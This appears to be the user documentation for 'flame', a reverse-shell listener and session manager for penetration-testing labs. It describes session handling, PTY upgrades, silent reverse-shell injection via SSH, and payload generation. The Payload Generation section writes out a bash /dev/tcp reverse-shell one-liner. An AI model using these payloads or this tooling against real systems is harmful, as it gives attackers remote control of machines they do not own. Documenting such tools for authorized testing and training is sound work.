# Sessions & Interactive Shell

Flame manages multiple reverse shell connections simultaneously. Each connection gets a unique session ID for easy switching.

## Receiving Connections

Start flame and it listens for incoming reverse shells:

```bash
./flame -i tun0 -p 4444
```

When a shell connects, flame automatically:

1. Assigns a session ID (1, 2, 3, ...)
2. Detects the platform (Linux/Windows)
3. Runs `whoami` and `hostname` for identification
4. Starts a health monitor in the background

```
 Reverse shell received on session 1 (10.10.11.123)
```

## Session Management

### List Sessions

```
󰗣 flame ❯ list
```

Shows all active sessions with their ID, remote address, user, hostname, and platform.

### Select a Session

```
󰗣 flame ❯ use 1
 Using session 1 (10.10.11.123)
```

All subsequent commands (shell, upload, download, run) operate on the selected session.

### Kill a Session

```
󰗣 flame ❯ kill 1
```

Closes the connection and removes the session.

## Interactive Shell in the TUI

The Bubble Tea TUI has two contexts:

- `menu` — flame commands like `list`, `use`, `upload`, `download`, `spawn`, `run`
- `shell` — interactive shell relay for the selected session

Use `shell` or press `F12` in menu mode to attach. Press `F12` again to detach.

Inside shell context, you can prefix flame commands with `!`:

```text
!upload
!download
!spawn
!kill
!run
```

This lets you keep shell context while still launching flame actions.

## Interactive Shell

### Linux (PTY Mode)

```
󰗣 flame [1] ❯ shell
```

Flame automatically upgrades the shell to a proper PTY:

1. Detects available interpreters (python3, python, script)
2. Runs `python3 -c 'import pty; pty.spawn("/bin/bash")'`
3. Sets terminal to raw mode
4. Configures rows/columns to match your terminal
5. Handles `SIGWINCH` — resize your terminal and the remote shell adapts

**Result:** Full interactive shell with tab completion, Ctrl+C, arrow keys, clear screen, and everything you'd expect from a real terminal.

**Exit:** Press `F12` to return to the flame menu.

### Windows (Line-Buffered Mode)

Windows shells use the TUI input bar in line-buffered mode:

- Up/down history in the TUI input
- `Ctrl+C` forwarded to the remote shell
- `F12` detach back to menu

Baseline PowerShell and `cmd` validation for the TUI is tracked separately in `docs/testing/windows-baseline.md`.

Platform is auto-detected from the prompt pattern (`PS C:\` = Windows).

## Spawning New Shells

From an existing session, spawn a new reverse shell on a different port:

```
󰗣 flame [1] ❯ spawn
```

This sends a platform-appropriate reverse shell payload in the background. The new session appears automatically. Module execution also uses spawned worker sessions internally, but those workers stay hidden from the normal session list and sidebar.

## SSH Automation

Connect via SSH and auto-inject a reverse shell:

```
󰗣 flame ❯ ssh user@10.10.11.123
󰗣 flame ❯ ssh user@10.10.11.123:2222
```

Flame will:

1. SSH into the target (prompts for password)
2. Execute a reverse shell payload silently
3. The new session appears in your session list

## Payload Generation

Generate ready-to-use reverse shell payloads:

```
󰗣 flame ❯ rev
```

Generates payloads using the listener's IP and port:

- **Bash** — `bash -i >& /dev/tcp/IP/PORT 0>&1`
- **Bash Base64** — Base64-encoded bash payload (bypasses special character issues)
- **PowerShell** — UTF-16LE encoded PowerShell reverse shell

You can also override the IP/port:

```
󰗣 flame ❯ rev 10.10.14.5 9001
```

## Session Logging

All session I/O is automatically logged to:

```
~/.flame/YYYY_MM_DD/IP_user_hostname/logs/session_N.log
```

Logs capture remote output for later review. Session directories are created lazily (only when a module or log needs them).

## Session Directories

Each unique host gets a shared directory:

```
~/.flame/2026_03_12/10.10.11.123_www-data_victim/
├── scripts/     # Downloaded module scripts
└── logs/        # Session logs, module outputs
```

The directory is reused across sessions to the same host, avoiding duplicate downloads.
